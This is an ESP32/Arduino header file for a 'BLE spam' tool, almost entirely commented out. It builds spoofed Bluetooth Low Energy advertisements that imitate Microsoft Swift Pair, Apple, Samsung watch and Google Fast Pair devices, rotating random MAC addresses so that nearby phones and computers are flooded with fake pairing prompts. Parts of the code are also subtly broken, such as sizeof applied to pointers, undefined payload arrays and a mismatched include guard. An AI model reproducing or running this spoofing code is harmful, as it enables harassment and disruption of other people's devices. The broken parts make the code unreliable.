#ifndef SOUR_BLE_SPAM_H
#define SOUR_BLE_SPAM_H



#include "Arduino.h"

// BLUETOOTH STUFF ///
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>

// enum EBLEPayloadType
// {
//   Microsoft,
//   Apple,
//   Samsung,
//   Google
// };

// struct WatchModel
// {
//     uint8_t value;
//     const char *name;
// };

// struct DeviceType {
//     uint32_t value;
//     String name;
// };



// class BLESpam {
// public:
// BLEAdvertising *pAdvertising;

// uint8_t* IOS1;

// uint8_t* IOS2;
// uint8_t* dataBLE;
// WatchModel* watch_models;
// int deviceType = 0;
// DeviceType* android_models; 
// int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));





// BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
//   BLEAdvertisementData AdvData = BLEAdvertisementData();

//   uint8_t* AdvData_Raw = nullptr;
//   uint8_t i = 0;

//   switch (Type) {
//     case Microsoft: {

//       const char* Name = this->generateRandomName();

//       uint8_t name_len = strlen(Name);

//       AdvData_Raw = new uint8_t[7 + name_len];

//       AdvData_Raw[i++] = 7 + name_len - 1;
//       AdvData_Raw[i++] = 0xFF;
//       AdvData_Raw[i++] = 0x06;
//       AdvData_Raw[i++] = 0x00;
//       AdvData_Raw[i++] = 0x03;
//       AdvData_Raw[i++] = 0x00;
//       AdvData_Raw[i++] = 0x80;
//       memcpy(&AdvData_Raw[i], Name, name_len);
//       i += name_len;

//       AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
//       break;
//     }
//     case Apple: {
//       int rand = random(2);
//       if(rand==0) AdvData.addData(std::string((char *)IOS1[random(sizeof(&IOS1)/sizeof(&IOS1[0]))], 31));
//       else        AdvData.addData(std::string((char *)IOS2[random(sizeof(&IOS2)/sizeof(&IOS2[0]))], 23));
//       break;
//     }
//     case Samsung: {

//       uint8_t model = watch_models[random(26)].value;
//       uint8_t Samsung_Data[15] = { 0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, (model >> 0x00) & 0xFF };
//       AdvData.addData(std::string((char *)Samsung_Data, 15));

//       break;
//     }
//     case Google: {
//       const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
//       uint8_t Google_Data[14] = { 
//         0x03, 0x03, 0x2C, 0xFE, //First 3 data to announce Fast Pair
//         0x06, 0x16, 0x2C, 0xFE, (model >> 0x10) & 0xFF, (model >> 0x08) & 0xFF, (model >> 0x00) & 0xFF, // 6 more data to inform FastPair and device data
//         0x02, 0x0A, (rand() % 120) - 100 }; // 2 more data to inform RSSI data.
//       AdvData.addData(std::string((char *)Google_Data, 14));
//       break;
//     }
//     default: {
//       Serial.println("Please Provide a Company Type");
//       break;
//     }
//   }

//   delete[] AdvData_Raw;

//   return AdvData;
// }
//   //// https://github.com/Spooks4576
// void  executeSpam(EBLEPayloadType type) {
//   uint8_t macAddr[6];
//   if(type != Apple) {
//      BLESpam::generateRandomMac(macAddr);
//     esp_base_mac_addr_set(macAddr);
//   }
//   BLEDevice::init("");
//   delay(10);
//   pAdvertising = BLEDevice::getAdvertising();
//   delay(40);
//   BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
//   BLEAdvertisementData oScanResponseData = BLEAdvertisementData();
//   pAdvertising->setAdvertisementData(advertisementData);
//   pAdvertising->setScanResponseData(oScanResponseData);
//   //pAdvertising->setAdvertisementType(ADV_TYPE_IND);
//   pAdvertising->start();
//   delay(50);

//   pAdvertising->stop();
//   delay(10);
//   BLEDevice::deinit();
//}


//  //void executeSpam(EBLEPayloadType type);
//  void aj_adv(int ble_choice);
//      const char* generateRandomName();


// private:
// struct BLEData
// {
//   BLEAdvertisementData AdvData;
//   BLEAdvertisementData ScanData;
// };



//WatchModel* watch_models = nullptr;

// struct mac_addr {
//    unsigned char bytes[6];
// };

// struct Station {
//   uint8_t mac[6];
//   bool selected;
// };

//     void  generateRandomMac(uint8_t* mac);
// };

#endif // SOUR_APPLE_H